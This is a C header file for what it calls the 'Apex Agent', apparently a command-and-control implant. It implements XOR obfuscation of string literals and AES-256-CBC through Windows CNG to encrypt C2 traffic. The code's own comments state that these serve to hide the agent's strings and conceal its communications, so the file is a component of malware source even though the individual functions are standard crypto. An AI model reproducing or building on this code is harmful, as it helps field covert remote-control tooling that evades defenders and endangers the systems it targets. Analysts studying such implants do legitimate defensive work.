#ifndef APEX_CRYPTO_H
#define APEX_CRYPTO_H

/*
 * Apex Agent Crypto Layer
 * - XOR string encryption/decryption (compile-time obfuscation)
 * - AES-256-CBC for C2 communication encryption
 * - Session key generation and exchange
 */

#include <windows.h>
#include <string.h>

/* ── XOR String Encryption ───────────────────────────────────
   Runtime XOR decrypt for strings. The build system can pre-encrypt
   string literals at compile time using XOR_KEY.
*/

#ifndef XOR_KEY
#define XOR_KEY 0x41
#endif

static void xor_decrypt(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= XOR_KEY;
}

/* Macro to define an XOR-encrypted string that decrypts at first use */
#define ENCRYPTED_STRING(varname, plaintext) \
    static char varname##_data[] = plaintext; \
    static int varname##_init = 0; \
    static char *varname##_get(void) { \
        if (!varname##_init) { \
            for (size_t i = 0; i < sizeof(varname##_data)-1; i++) \
                varname##_data[i] ^= XOR_KEY; \
            varname##_init = 1; \
        } \
        return varname##_data; \
    }

/* ── AES-256-CBC via Windows CNG (bcrypt.h) ──────────────── */

#include <bcrypt.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    UCHAR iv[16];
    UCHAR key[32];
    int   ready;
} aes_ctx;

static int aes_init(aes_ctx *ctx, const UCHAR *key32, const UCHAR *iv16) {
    memset(ctx, 0, sizeof(*ctx));
    memcpy(ctx->key, key32, 32);
    memcpy(ctx->iv, iv16, 16);

    NTSTATUS st = BCryptOpenAlgorithmProvider(&ctx->hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(st)) return -1;

    st = BCryptSetProperty(ctx->hAlg, BCRYPT_CHAINING_MODE,
                           (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                           sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(st)) { BCryptCloseAlgorithmProvider(ctx->hAlg, 0); return -1; }

    st = BCryptGenerateSymmetricKey(ctx->hAlg, &ctx->hKey, NULL, 0,
                                    (PUCHAR)ctx->key, 32, 0);
    if (!NT_SUCCESS(st)) { BCryptCloseAlgorithmProvider(ctx->hAlg, 0); return -1; }

    ctx->ready = 1;
    return 0;
}

static void aes_free(aes_ctx *ctx) {
    if (ctx->hKey) BCryptDestroyKey(ctx->hKey);
    if (ctx->hAlg) BCryptCloseAlgorithmProvider(ctx->hAlg, 0);
    SecureZeroMemory(ctx->key, 32);
    ctx->ready = 0;
}

/* Encrypt in-place. buf must have room for PKCS7 padding (up to +16 bytes).
   Returns encrypted length, or -1 on error. */
static int aes_encrypt(aes_ctx *ctx, UCHAR *buf, ULONG plainLen, ULONG bufSize) {
    if (!ctx->ready) return -1;
    UCHAR iv[16];
    memcpy(iv, ctx->iv, 16);

    ULONG cbResult = 0;
    NTSTATUS st = BCryptEncrypt(ctx->hKey, buf, plainLen, NULL,
                                iv, 16, buf, bufSize, &cbResult,
                                BCRYPT_BLOCK_PADDING);
    return NT_SUCCESS(st) ? (int)cbResult : -1;
}

/* Decrypt in-place. Returns decrypted length, or -1 on error. */
static int aes_decrypt(aes_ctx *ctx, UCHAR *buf, ULONG cipherLen) {
    if (!ctx->ready) return -1;
    UCHAR iv[16];
    memcpy(iv, ctx->iv, 16);

    ULONG cbResult = 0;
    NTSTATUS st = BCryptDecrypt(ctx->hKey, buf, cipherLen, NULL,
                                iv, 16, buf, cipherLen, &cbResult,
                                BCRYPT_BLOCK_PADDING);
    return NT_SUCCESS(st) ? (int)cbResult : -1;
}

/* Generate random bytes using CNG */
static int crypto_random(UCHAR *buf, ULONG len) {
    BCRYPT_ALG_HANDLE hRng;
    if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hRng, BCRYPT_RNG_ALGORITHM, NULL, 0)))
        return -1;
    NTSTATUS st = BCryptGenRandom(hRng, buf, len, 0);
    BCryptCloseAlgorithmProvider(hRng, 0);
    return NT_SUCCESS(st) ? 0 : -1;
}

#endif /* APEX_CRYPTO_H */
